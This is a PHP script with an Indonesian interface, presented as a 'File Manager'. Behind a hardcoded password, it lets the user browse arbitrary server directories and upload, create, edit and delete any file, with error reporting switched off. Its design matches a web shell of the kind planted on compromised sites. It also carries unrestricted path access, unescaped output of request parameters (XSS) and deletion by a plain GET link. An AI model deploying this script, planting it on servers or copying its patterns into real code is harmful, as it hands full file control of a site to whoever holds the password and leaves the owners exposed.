<?php
error_reporting(0);
session_start();

// Password untuk akses
$password = "bismillah";

// Cek login
if (isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Password salah!";
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// Cek login sebelum menampilkan file manager
if (!isset($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login File Manager</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body { background-color: #121212; color: white; }
            .card { background-color: #1e1e1e; }
        </style>
    </head>
    <body class="d-flex justify-content-center align-items-center vh-100">
        <div class="card p-4">
            <h3 class="text-center">File Manager Login</h3>
            <?php if (isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
            <form method="POST">
                <input type="password" name="password" class="form-control mb-2" placeholder="Masukkan Password" required>
                <button type="submit" class="btn btn-primary w-100">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($dir)) die("Direktori tidak valid!");

function listFiles($dir) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == "." || $file == "..") continue;
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        $link = "?dir=" . urlencode($dir) . "&file=" . urlencode($file);
        echo "<tr>
                <td><a href='{$link}' class='text-light'>" . (is_dir($path) ? "📁" : "📄") . " $file</a></td>
                <td>" . filesize($path) . " bytes</td>
                <td>
                    <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Hapus $file?\");' class='btn btn-danger btn-sm'>🗑️ Hapus</a>
                </td>
              </tr>";
    }
}

if (isset($_POST['new_file'])) file_put_contents($dir . "/" . $_POST['new_file'], "");
if (isset($_FILES['upload'])) move_uploaded_file($_FILES['upload']['tmp_name'], $dir . "/" . $_FILES['upload']['name']);
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    header("Location: ?dir=" . urlencode($dir));
}

if (isset($_POST['save_file']) && isset($_GET['file'])) {
    file_put_contents($dir . "/" . $_GET['file'], $_POST['content']);
    header("Location: ?dir=" . urlencode($dir));
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #121212; color: white; }
        .container { max-width: 900px; margin-top: 20px; }
        .card { background-color: #1e1e1e; }
    </style>
</head>
<body>

<div class="container">
    <div class="d-flex justify-content-between align-items-center">
        <h2>File Manager</h2>
        <a href="?logout" class="btn btn-danger">Logout</a>
    </div>
    
    <p>Path: <b><?php echo $dir; ?></b></p>

    <!-- Upload File -->
    <form method="POST" enctype="multipart/form-data" class="mb-3">
        <div class="input-group">
            <input type="file" name="upload" class="form-control">
            <button type="submit" class="btn btn-success">Upload</button>
        </div>
    </form>

    <!-- Buat File Baru -->
    <form method="POST" class="mb-3">
        <div class="input-group">
            <input type="text" name="new_file" class="form-control" placeholder="Buat file baru">
            <button type="submit" class="btn btn-primary">Buat</button>
        </div>
    </form>

    <!-- List File & Direktori -->
    <table class="table table-dark table-striped">
        <tr>
            <th>Nama</th>
            <th>Ukuran</th>
            <th>Aksi</th>
        </tr>
        <?php listFiles($dir); ?>
    </table>

    <!-- Edit File -->
    <?php if (isset($_GET['file']) && is_file($dir . "/" . $_GET['file'])): ?>
        <div class="card p-3">
            <h3>Edit File: <?php echo $_GET['file']; ?></h3>
            <form method="POST">
                <textarea name="content" rows="10" class="form-control mb-2"><?php echo htmlspecialchars(file_get_contents($dir . "/" . $_GET['file'])); ?></textarea>
                <button type="submit" name="save_file" class="btn btn-warning">Simpan</button>
            </form>
        </div>
    <?php endif; ?>

</div>

</body>
</html>
